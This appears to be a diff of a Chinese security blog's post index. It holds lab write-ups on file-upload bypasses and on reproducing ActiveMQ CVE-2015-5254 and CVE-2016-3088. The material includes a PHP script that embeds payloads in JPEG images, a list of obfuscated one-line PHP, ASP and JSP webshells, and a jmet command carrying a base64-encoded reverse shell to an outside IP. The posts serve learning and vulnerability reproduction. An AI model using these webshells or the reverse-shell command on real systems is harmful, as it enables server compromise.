<span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h3><p>content-type</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text/html ： HTML格式</span><br><span class="line">text/plain ：纯文本格式</span><br><span class="line">text/xml ： XML格式</span><br><span class="line">image/gif ：gif图片格式</span><br><span class="line">image/jpeg ：jpg图片格式</span><br><span class="line">image/png：png图片格式</span><br><span class="line">以application开头的媒体格式类型：</span><br><span class="line"></span><br><span class="line">application/xhtml+xml ：XHTML格式</span><br><span class="line">application/xml： XML数据格式</span><br><span class="line">application/atom+xml ：Atom XML聚合格式</span><br><span class="line">application/json： JSON数据格式</span><br><span class="line">application/pdf：pdf格式</span><br><span class="line">application/msword ： Word文档格式</span><br><span class="line">application/octet-stream ： 二进制流数据（如常见的文件下载）</span><br><span class="line">application/x-www-form-urlencoded ： &lt;form encType=””&gt;中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</span><br><span class="line">另外一种常见的媒体格式是上传文件之时使用的：</span><br><span class="line"></span><br><span class="line">multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure>
+
+<h3 id="对文件内容验证"><a href="#对文件内容验证" class="headerlink" title="对文件内容验证"></a>对文件内容验证</h3><p>其实要是对文件内容验证，要不是一些很常规的一些，那基本要白盒去做了</p>
+<h4 id="过滤php和"><a href="#过滤php和" class="headerlink" title="过滤php和?"></a>过滤php和?</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不一定成功，有条件限制</p>
+<h4 id="过滤eval"><a href="#过滤eval" class="headerlink" title="过滤eval"></a>过滤eval</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_POST[&#x27;cmd&#x27;];)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><ul>
+<li>php</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;xindong&quot;]); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php $lang = (string)key($_POST);$lang($_POST[&#x27;xindong&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125; [&#x27;xindong&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[&quot;xindong&quot;]);  ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php                  </span><br><span class="line">@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;                  </span><br><span class="line">@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;                  </span><br><span class="line">@$_/*-/*-*/($/*-/*-*/&#123;&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;&#125;                  </span><br><span class="line">[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?&gt;    密码是  -7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>asp</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%execute(request(“cmd”))%&gt;</span><br><span class="line">&lt;%execute request(“1”)%&gt;</span><br><span class="line">ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a</span><br><span class="line">&quot;%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%’ p</span><br><span class="line">&lt;%Y=request(“xindong”)%&gt; &lt;%execute(Y)%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%eval&quot;&quot;&amp;(“e”&amp;“v”&amp;“a”&amp;“l”&amp;&quot;(&quot;&amp;“r”&amp;“e”&amp;“q”&amp;“u”&amp;“e”&amp;“s”&amp;“t”&amp;&quot;(&quot;&amp;“0”&amp;&quot;-&quot;&amp;“2”&amp;&quot;-&quot;&amp;“5”&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;（密码是-7）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jsp</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">select ‘&lt;?php eval($_POST[cmd];?&gt;’ into outfile ‘C:/Inetpub/wwwroot/mysql-php/1.php’</span><br></pre></td></tr></table></figure>
+
+<h1 id="Fuzz相关字典和工具"><a href="#Fuzz相关字典和工具" class="headerlink" title="Fuzz相关字典和工具"></a>Fuzz相关字典和工具</h1><p><a class="link"   href="https://github.com/814561039/FUZZ-dic" >814561039&#x2F;FUZZ-dic: 文件上传、目录爆破等Fuzz字典 (github.com)<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>技术探索</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
+    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
+    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
+<p>目标:</p>
+<p>· 看这些大漏洞在实际的应用</p>
+<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
+<p>· 修复漏洞</p>
+<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
+<p>有关JMS Attack的文章：</p>
+<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>上一篇的翻译</p>
+<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>又到了我们最喜欢的getObject()环节</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
+<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
+<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
+<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
+<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
+<p>wow，我们成功发现了后台界面(＾－＾)V</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
+<p>什么，居然用admin和admin就登陆进去了（）</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
+<p>居然正是漏洞版本，太巧了吧（</p>
+<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
+<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>
+
+<p>之后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
+<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
+<p>getshell  !!!!!</p>
+<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
+<p>2.解决前台弱口令问题</p>
+<p>3.隐藏接受信息的端口</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>ActActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CISCN2024-web复现</title>
     <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>
@@ -136,201 +409,6 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
-    <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
-    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
-
-<h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p>5,14.0之前的版本</p>
-<p>5.12.x~5.13.x:需要开启fileserver应用(此应用默认关闭)</p>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
-<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。</p>
-<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
-<h1 id="漏洞详细"><a href="#漏洞详细" class="headerlink" title="漏洞详细"></a>漏洞详细</h1><p>既然可以写入文件并且可以移动，那就会有下面四种方法，不过只能复现成功前两种，看了很多文章3,4好像也没什么人复现出来，而p神也只留下一句话：理论上可以，但尚未测试。。。。。。。。有种费马解费马大定理的美，然后我自己的功力当然也是做不到了的</p>
-<ol>
-<li>写入webshell</li>
-<li>写入cron</li>
-<li>写入jar或jetty.xml等库和配置文件</li>
-<li>写入ssh key</li>
-</ol>
-<h1 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h1><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>PUT</code> 请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用 <code>PUT</code> 请求方式会覆盖原有的资源内容，因此需要谨慎使用。</p>
-<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>本地一直没弄成功,PUT方法是一直被锁的</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531142351189.png"  alt="image-20240531142351189"></p>
-<p><a class="link"   href="https://www.cnblogs.com/kuoaidebb/p/4466602.html" >HTTP - PUT 上传文件&#x2F;Shell - 阔爱的贝贝 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>不过这put虽说可以上传，但是上传的目录是被锁死的，只要这个目录里不解析webshell也没辙，主要是这个Move有点伤</p>
-<h2 id="Move请求"><a href="#Move请求" class="headerlink" title="Move请求"></a>Move请求</h2><p><a class="link"   href="https://http-statuscode.com/zh/method/MOVE" >HTTP 方法: MOVE (http-statuscode.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>重要参数Destination</p>
-<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>linux上的定时任务</p>
-<p><a class="link"   href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" >Linux Crontab 定时任务 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240531151440878.png"  alt="image-20240531151440878"></p>
-<p>每隔一分钟复制1.txt成2.txt到根目录，当然这个命令只能执行一次，因为不能同名吧，我主要想实验是发起任务的那一刻开启做，还是一分钟后开始做</p>
-<p>使用crontab命令是把定时任务设置在&#x2F;tmp&#x2F;crontab里的，名字随机，不好推出了并且写入</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152305281.png"  alt="image-20240531152305281"></p>
-<p>所以我们找到可以直接写入的<code>/etc/cron.d</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152513931.png"  alt="image-20240531152513931"></p>
-<p>有三个用户，一般使用root用户</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开日</p>
-<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240531155110593.png"  alt="image-20240531155110593"></p>
-<p>弱口令爆破admin&#x2F;admin</p>
-<p>访问已经站点<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>信息收集</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531155345986.png"  alt="image-20240531155345986"></p>
-<p>我们只需要两个信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activemq.base	/opt/activemq  #网站根目录，会解析jsp木马文件</span><br><span class="line">user.name	root               #/etc/cron.d目录所有者是root，若这里不是root估计打不成功</span><br></pre></td></tr></table></figure>
-
